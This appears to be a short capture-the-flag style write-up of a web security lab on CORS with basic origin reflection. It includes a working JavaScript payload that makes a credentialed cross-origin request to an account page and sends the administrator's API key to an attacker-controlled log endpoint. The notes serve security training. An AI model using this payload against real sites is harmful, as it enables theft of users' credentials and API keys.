# CORS

## CORS vulnerability with basic origin reflection
After logging in, the application includes an API key in the response to /accountdetails page. 

Notice that after logging in the response includes the header `Access-Control-Allow-Credentials: true` indicating the web server supports CORS

Modifying the request with the header `Origin: example.com` the request includes the header `Access-Control-Allow-Origin: example.com`

Stage this in the exploit server 
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
The XMLHttpRequest from the malicious domain is possible because CORS is enabled. Set withCredentials=true to include the API Key in the response.
The reqListener takes the response and appends it to the log.
Then we check the log to find the administrator's API key